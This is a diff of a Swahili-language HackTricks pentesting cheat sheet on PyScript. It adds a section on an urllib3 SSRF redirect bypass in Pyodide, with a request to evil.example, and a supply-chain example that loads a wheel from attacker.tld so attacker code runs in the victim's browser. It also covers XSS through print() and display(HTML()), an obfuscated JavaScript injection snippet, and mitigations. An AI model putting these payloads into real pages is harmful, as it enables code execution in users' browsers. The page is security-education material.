@@ -4,7 +4,7 @@
 
 ## Mwongozo wa PyScript Pentesting
 
-PyScript ni mfumo mpya ulioandaliwa kwa ajili ya kuunganisha Python katika HTML ili iweze kutumika pamoja na HTML. Katika karatasi hii ya udanganyifu, utaona jinsi ya kutumia PyScript kwa madhumuni yako ya upenyo.
+PyScript ni mfumo mpya ulioandaliwa kwa ajili ya kuunganisha Python katika HTML ili, iweze kutumika pamoja na HTML. Katika karatasi hii ya udanganyifu, utaona jinsi ya kutumia PyScript kwa madhumuni yako ya kupenya.
 
 ### Kutupa / Kurejesha faili kutoka kwenye mfumo wa faili wa kumbukumbu wa Emscripten:
 
@@ -78,7 +78,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 Code:
 ```html
 <py-script>
-prinht("
+prinht(""
 <script>
 var _0x3675bf = _0x5cf5
 function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -140,7 +140,7 @@ return _0x34a15f
 return _0x599c()
 }
 </script>
-")
+"")
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
@@ -155,5 +155,63 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+
+---
+
+## Uthibitisho mpya & mbinu (2023-2025)
+
+### Server-Side Request Forgery kupitia upitisho usio na udhibiti (CVE-2025-50182)
+
+`urllib3 < 2.5.0` inapuuzilia mbali vigezo vya `redirect` na `retries` wakati inatekelezwa **ndani ya mazingira ya Pyodide** yanayokuja na PyScript. Wakati mshambuliaji anaweza kuathiri URL za lengo, wanaweza kulazimisha msimbo wa Python kufuata upitisho wa kuvuka maeneo hata wakati mbunifu amezuia waziwazi ‑ kwa ufanisi kuzunguka mantiki ya kupambana na SSRF.
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+Imepatikana katika `urllib3 2.5.0` – sasisha kifurushi katika picha yako ya PyScript au weka toleo salama katika `packages = ["urllib3>=2.5.0"]`. Tazama kuingia rasmi kwa CVE kwa maelezo zaidi.
+
+### Upakiaji wa kifurushi bila mpangilio & mashambulizi ya mnyororo wa usambazaji
+
+Kwa kuwa PyScript inaruhusu URL zisizo na mpangilio katika orodha ya `packages`, mhusika mbaya ambaye anaweza kubadilisha au kuingiza usanidi anaweza kutekeleza **Python isiyo na mpangilio kabisa** katika kivinjari cha mwathirika:
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+*Ni magurudumu ya pure-Python pekee yanahitajika – hakuna hatua ya uundaji wa WebAssembly inayohitajika.* Hakikisha usanidi hauwezi kudhibitiwa na mtumiaji na mwenyeji wa magurudumu ya kuaminika kwenye eneo lako mwenyewe kwa HTTPS & SRI hashes.
+
+### Mabadiliko ya usafi wa matokeo (2023+)
+
+* `print()` bado inaingiza HTML safi na kwa hivyo ni hatari ya XSS (mfano hapo juu).
+* Msaada mpya wa `display()` **huondoa HTML kwa chaguo-msingi** – alama safi lazima iwekwe ndani ya `pyscript.HTML()`.
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+Hali hii ilianzishwa mwaka 2023 na imeandikwa katika mwongozo rasmi wa Built-ins. Tegemea `display()` kwa pembejeo zisizoaminika na epuka kuita `print()` moja kwa moja.
+
+---
+
+## Mbinu Bora za Kijihifadhi
+
+* **Sasisha pakiti** – panda hadi `urllib3 >= 2.5.0` na mara kwa mara jenga tena magurudumu yanayokuja na tovuti.
+* **Punguza vyanzo vya pakiti** – rejelea majina ya PyPI au URLs za asili moja, bora zaidi zilizo na ulinzi wa Sub-resource Integrity (SRI).
+* **Imarisha Sera ya Usalama wa Maudhui** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili vizuizi vya `<script>` vilivyoingizwa visiweze kutekelezwa.
+* **Kataza lebo za mtumiaji `<py-script>` / `<script type="py">`** – safisha HTML kwenye seva kabla ya kuirudisha kwa watumiaji wengine.
+* **Tenga wafanyakazi** – ikiwa huhitaji ufikiaji wa synchronous kwa DOM kutoka kwa wafanyakazi, wezesha bendera ya `sync_main_only` ili kuepuka mahitaji ya kichwa cha `SharedArrayBuffer`.
+
+## Marejeleo
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [Dokumenti za Built-ins za PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
 {{#include ../../banners/hacktricks-training.md}}
